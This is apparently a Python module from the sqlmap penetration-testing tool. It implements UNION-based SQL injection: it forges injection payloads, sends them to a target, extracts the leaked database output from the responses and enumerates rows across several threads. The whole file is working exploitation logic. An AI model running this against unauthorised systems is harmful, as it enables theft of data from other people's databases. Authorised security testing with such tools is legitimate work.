#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import extractRegexResult
from lib.core.common import flattenValue
from lib.core.common import getConsoleWidth
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import parseUnionPage
from lib.core.common import removeReflectiveValues
from lib.core.common import singleTimeDebugMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import wasLastRequestDBMSError
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapSyntaxException
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def _oneShotUnionUse(expression, unpack=True, limited=False):
    retVal = hashDBRetrieve("%s%s" % (conf.hexConvert, expression), checkConf=True)  # as union data is stored raw unconverted

    threadData = getCurrentThreadData()
    threadData.resumed = retVal is not None

    if retVal is None:
        # Prepare expression with delimiters
        injExpression = unescaper.unescape(agent.concatQuery(expression, unpack))

        where = PAYLOAD.WHERE.NEGATIVE if conf.limitStart or conf.limitStop else None

        # Forge the union SQL injection request
        vector = kb.injection.data[PAYLOAD.TECHNIQUE.UNION].vector
        kb.unionDuplicates = vector[7]
        query = agent.forgeUnionQuery(injExpression, vector[0], vector[1], vector[2], vector[3], vector[4], vector[5], vector[6], None, limited)
        payload = agent.payload(newValue=query, where=where)

        # Perform the request
        page, headers = Request.queryPage(payload, content=True, raise404=False)

        incrementCounter(PAYLOAD.TECHNIQUE.UNION)

        # Parse the returned page to get the exact union-based
        # SQL injection output
        def _(regex):
            return reduce(lambda x, y: x if x is not None else y, ( \
                    extractRegexResult(regex, removeReflectiveValues(page, payload), re.DOTALL | re.IGNORECASE), \
                    extractRegexResult(regex, removeReflectiveValues(listToStrValue(headers.headers \
                    if headers else None), payload, True), re.DOTALL | re.IGNORECASE)), \
                    None)

        # Automatically patching last char trimming cases
        if kb.chars.stop not in (page or "") and kb.chars.stop[:-1] in (page or ""):
            warnMsg = "automatically patching output having last char trimmed"
            singleTimeWarnMessage(warnMsg)
            page = page.replace(kb.chars.stop[:-1], kb.chars.stop)

        retVal = _("(?P<result>%s.*%s)" % (kb.chars.start, kb.chars.stop))

        if retVal is not None:
            retVal = getUnicode(retVal, kb.pageEncoding)

            # Special case when DBMS is Microsoft SQL Server and error message is used as a result of union injection
            if Backend.isDbms(DBMS.MSSQL) and wasLastRequestDBMSError():
                retVal = htmlunescape(retVal).replace("<br>", "\n")

            hashDBWrite("%s%s" % (conf.hexConvert, expression), retVal)
        else:
            trimmed = _("%s(?P<result>.*?)<" % (kb.chars.start))

            if trimmed:
                warnMsg = "possible server trimmed output detected (probably due to its length): "
                warnMsg += safecharencode(trimmed)
                logger.warn(warnMsg)

    return retVal

def configUnion(char=None, columns=None):
    def _configUnionChar(char):
        if not isinstance(char, basestring):
            return

        kb.uChar = char

        if conf.uChar is not None:
            kb.uChar = char.replace("[CHAR]", conf.uChar if conf.uChar.isdigit() else "'%s'" % conf.uChar.strip("'"))

    def _configUnionCols(columns):
        if not isinstance(columns, basestring):
            return

        columns = columns.replace(" ", "")
        if "-" in columns:
            colsStart, colsStop = columns.split("-")
        else:
            colsStart, colsStop = columns, columns

        if not colsStart.isdigit() or not colsStop.isdigit():
            raise SqlmapSyntaxException, "--union-cols must be a range of integers"

        conf.uColsStart, conf.uColsStop = int(colsStart), int(colsStop)

        if conf.uColsStart > conf.uColsStop:
            errMsg = "--union-cols range has to be from lower to "
            errMsg += "higher number of columns"
            raise SqlmapSyntaxException, errMsg

    _configUnionChar(char)
    _configUnionCols(conf.uCols or columns)

def unionUse(expression, unpack=True, dump=False):
    """
    This function tests for an union SQL injection on the target
    url then call its subsidiary function to effectively perform an
    union SQL injection on the affected url
    """

    initTechnique(PAYLOAD.TECHNIQUE.UNION)

    abortedFlag = False
    count = None
    origExpr = expression
    startLimit = 0
    stopLimit = None
    value = None

    width = getConsoleWidth()
    start = time.time()

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(origExpr)

    if expressionFieldsList and len(expressionFieldsList) > 1 and "ORDER BY" in expression.upper():
        # Removed ORDER BY clause because UNION does not play well with it
        expression = re.sub("\s*ORDER BY\s+[\w,]+", "", expression, re.I)
        debugMsg = "stripping ORDER BY clause from statement because "
        debugMsg += "it does not play well with UNION query SQL injection"
        singleTimeDebugMessage(debugMsg)

    # We have to check if the SQL query might return multiple entries
    # if the technique is partial UNION query and in such case forge the
    # SQL limiting the query output one entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if (kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.NEGATIVE or \
       (dump and (conf.limitStart or conf.limitStop))) and \
       " FROM " in expression.upper() and ((Backend.getIdentifiedDbms() \
       not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE \
       and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            output = _oneShotUnionUse(countedExpression, unpack)
            count = parseUnionPage(output)

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            elif count and (not isinstance(count, basestring) or not count.isdigit()):
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            threadData = getCurrentThreadData()
            threadData.shared.limits = iter(xrange(startLimit, stopLimit))
            numThreads = min(conf.threads, (stopLimit - startLimit))
            threadData.shared.value = BigArray()
            threadData.shared.buffered = []
            threadData.shared.lastFlushed = startLimit - 1

            if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                kb.suppressResumeInfo = True
                debugMsg = "suppressing possible resume console info because of "
                debugMsg += "large number of rows. It might take too long"
                logger.debug(debugMsg)

            try:
                def unionThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.limits:
                            try:
                                num = threadData.shared.limits.next()
                            except StopIteration:
                                break

                        if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                            field = expressionFieldsList[0]
                        elif Backend.isDbms(DBMS.ORACLE):
                            field = expressionFieldsList
                        else:
                            field = None

                        limitedExpr = agent.limitQuery(num, expression, field)
                        output = _oneShotUnionUse(limitedExpr, unpack, True)

                        if not kb.threadContinue:
                            break

                        if output:
                            if all(map(lambda _: _ in output, (kb.chars.start, kb.chars.stop))):
                                items = parseUnionPage(output)

                                with kb.locks.value:
                                    index = None
                                    for index in xrange(len(threadData.shared.buffered)):
                                        if threadData.shared.buffered[index][0] >= num:
                                            break
                                    threadData.shared.buffered.insert(index or 0, (num, items))
                                    while threadData.shared.buffered and threadData.shared.lastFlushed + 1 == threadData.shared.buffered[0][0]:
                                        threadData.shared.lastFlushed += 1
                                        _ = threadData.shared.buffered[0][1]
                                        if not isNoneValue(_):
                                            threadData.shared.value.extend(arrayizeValue(_))
                                        del threadData.shared.buffered[0]
                            else:
                                with kb.locks.value:
                                    index = None
                                    for index in xrange(len(threadData.shared.buffered)):
                                        if threadData.shared.buffered[index][0] >= num:
                                            break
                                    threadData.shared.buffered.insert(index or 0, (num, None))
                                items = output.replace(kb.chars.start, "").replace(kb.chars.stop, "").split(kb.chars.delimiter)

                            if conf.verbose == 1 and not (threadData.resumed and kb.suppressResumeInfo):
                                status = "[%s] [INFO] %s: %s" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", safecharencode(",".join("\"%s\"" % _ for _ in flattenValue(arrayizeValue(items)))))

                                if len(status) > width:
                                    status = "%s..." % status[:width - 3]

                                dataToStdout("%s\r\n" % status, True)

                runThreads(numThreads, unionThread)

                if conf.verbose == 1:
                    clearConsoleLine(True)

            except KeyboardInterrupt:
                abortedFlag = True

                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            finally:
                for _ in sorted(threadData.shared.buffered):
                    if not isNoneValue(_[1]):
                        threadData.shared.value.extend(arrayizeValue(_[1]))
                value = threadData.shared.value
                kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        value = _oneShotUnionUse(expression, unpack)

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (kb.counters[PAYLOAD.TECHNIQUE.UNION], duration)
        logger.debug(debugMsg)

    return value
